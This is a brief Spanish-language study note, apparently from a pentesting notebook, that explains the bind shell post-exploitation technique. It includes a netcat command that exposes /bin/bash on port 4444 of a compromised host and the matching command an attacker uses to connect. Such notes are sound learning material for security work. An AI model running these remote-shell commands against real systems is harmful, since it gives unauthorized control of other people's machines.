
---
- Tags: #Network #Post-exploitation #Attacks 
- --- 
# Qué es? 

Una **bind shell** es una técnica de post-explotación donde:

- **La víctima abre (bindea) un puerto y queda escuchando**  
-  **El atacante se conecta a ese puerto**  
- Al conectarse, obtiene una **shell del sistema víctima**

**Básicamente:**
> _La máquina comprometida expone una shell en un puerto, nosotros nos conectamos_ 


_Nota: **La bind shell casí nunca se ocupa ya que muchos firewalls/IDS no permiten conexiones entrantes**_

# Explotación

```bash
nc -lvnp 4444 -e /bin/bash
```

Desde la máquina ya vulnerada se levanta cualquier puerto **(en este caso el 4444)** y espera una conexíon entrante.

**Nosotros desde nuestra máquina**

```bash
nc 10.10.10.10 4444
```

Nos conectamos y automáticamente se nos dará una /bin/bash



